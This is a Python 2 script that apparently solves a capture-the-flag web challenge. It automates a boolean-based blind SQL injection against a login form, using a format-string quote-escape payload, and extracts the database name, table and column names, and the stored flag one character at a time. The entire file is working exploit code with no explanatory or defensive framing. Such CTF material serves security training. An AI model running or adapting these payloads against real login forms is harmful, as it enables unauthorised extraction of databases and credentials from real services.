#coding:utf-8

import requests
import string

def boom():
    url = r'http://b3ee9808fb20470fae28f584931a4439d26fc5b316da4055.changame.ichunqiu.com/'
    #url = r'http://2e1e6e1074b64cb8bab6bf62d3d5b606e8b1f7f8c6d64b5d.game.ichunqiu.com/index.php'
    s = requests.session()
    dic = string.digits + string.letters + "!@#$%^&*()_+{}-="
    right = 'password error!'
    error = 'username error!'

    lens = 0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "length(database())>" + str(i) + "#"
        data={'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens=i
            break
        i+=1
        pass
    print("[+]length(database()): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr(database()," + str(i) +",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]database():%s" %(strs))

    lens=0
    i = 1
    while True:
        payload = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(table): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(i) +",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]table_name:%s" %(strs))
    tablename = '0x' + strs.encode('hex')
    table_name = strs

    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name = " + str(tablename) + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(column): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_name = " + str(tablename) +" limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]column_name:%s" %(strs))
    column_name = strs

    num=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select count(*) from " + table_name + ")>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            num = i
            break
        i+=1
        pass
    print("[+]number(column): %d" %(num))

    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(" + column_name + ") from " + table_name + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(value): %d" %(lens))

    i=1    
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or ascii(substr((select flag from flag limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':'1'}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]flag:%s" %(strs))

if __name__ == '__main__':
    boom()
    print 'Finish!'
